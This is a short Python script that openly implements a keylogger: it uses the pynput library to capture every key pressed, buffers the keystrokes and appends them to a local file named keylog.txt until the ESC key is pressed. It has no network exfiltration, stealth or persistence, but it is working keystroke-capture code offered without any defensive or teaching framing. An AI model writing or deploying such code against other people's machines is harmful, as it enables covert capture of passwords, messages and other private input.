from pynput import keyboard

LOG_FILE = "keylog.txt"
BUFFER_SIZE = 10  # Adjust based on your needs
keystroke_buffer = []  # Store keystrokes temporarily

def on_press(key):
    global keystroke_buffer

    try:
        keystroke_buffer.append(key.char)  # Append key to buffer
    except AttributeError:
        keystroke_buffer.append(f"[{str(key)}]")

    # Write to file only when buffer is full
    if len(keystroke_buffer) >= BUFFER_SIZE:
        with open(LOG_FILE, "a") as f:
            f.write("".join(keystroke_buffer) + "\n")
        keystroke_buffer = []  # Clear buffer

    # Stop keylogger when ESC is pressed
    if key == keyboard.Key.esc:
        if keystroke_buffer:
            with open(LOG_FILE, "a") as f:
                f.write("".join(keystroke_buffer) + "\n")  # Final write
        return False  # Stop listener

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Run keylogger
start_keylogger()
